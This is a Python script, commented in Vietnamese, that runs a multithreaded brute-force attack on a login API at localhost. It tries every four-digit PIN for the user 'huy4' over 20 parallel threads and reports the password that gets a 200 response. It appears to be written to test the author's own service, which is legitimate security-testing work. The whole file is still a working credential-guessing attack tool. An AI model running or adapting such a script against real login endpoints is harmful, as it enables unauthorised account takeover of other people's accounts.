import requests
import time
from concurrent.futures import ThreadPoolExecutor

# Cấu hình API
API_URL = "http://localhost:8000/login"
USERNAME = "huy4"
MAX_WORKERS = 20  # Số lượng luồng chạy song song (có thể tăng lên 50 nếu máy mạnh)

print(f"Bắt đầu test Brute Force (Tối ưu Đa luồng) vào {API_URL}...")
start_time = time.time()

# 1. Sử dụng Session để tái sử dụng kết nối TCP
session = requests.Session()

# Biến cờ (flag) để báo hiệu cho các luồng dừng lại nếu đã tìm thấy mật khẩu
found_password = None

def attempt_login(pin):
    global found_password
    
    # Nếu một luồng khác đã bẻ khóa thành công, các luồng còn lại tự động hủy bỏ
    if found_password:
        return
        
    password_attempt = f"{pin:04d}" # Format 4 chữ số (vd: 7 -> "0007")
    payload = {
        "username": USERNAME,
        "password": password_attempt
    }
    
    try:
        response = session.post(API_URL, json=payload, timeout=2)
        
        # In tiến độ (giảm tần suất in log để không làm nghẽn CPU terminal)
        if pin % 1000 == 0:
            print(f"[*] Đang quét vùng mã: {password_attempt}...")

        if response.status_code == 200:
            found_password = password_attempt
            
    except requests.exceptions.RequestException:
        # Bỏ qua các lỗi rớt mạng lẻ tẻ để script không bị dừng đột ngột
        pass

# 2. Sử dụng ThreadPoolExecutor để tạo đa luồng
# max_workers = 20 nghĩa là có 20 "nhân viên" cùng lúc gửi request
with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
    # Phân phát 10.000 công việc (từ 0 đến 9999) cho các luồng xử lý
    executor.map(attempt_login, range(10000))

# Kết quả
if found_password:
    print("\n" + "="*40)
    print(f"[+] ĐĂNG NHẬP THÀNH CÔNG!")
    print(f"[+] Password chính xác là: {found_password}")
    print(f"[+] Tổng thời gian quét: {round(time.time() - start_time, 2)} giây")
    print("="*40)
else:
    print("\n[-] Đã quét xong 10.000 trường hợp nhưng không tìm thấy mật khẩu.")
    print(f"[-] Tổng thời gian: {round(time.time() - start_time, 2)} giây")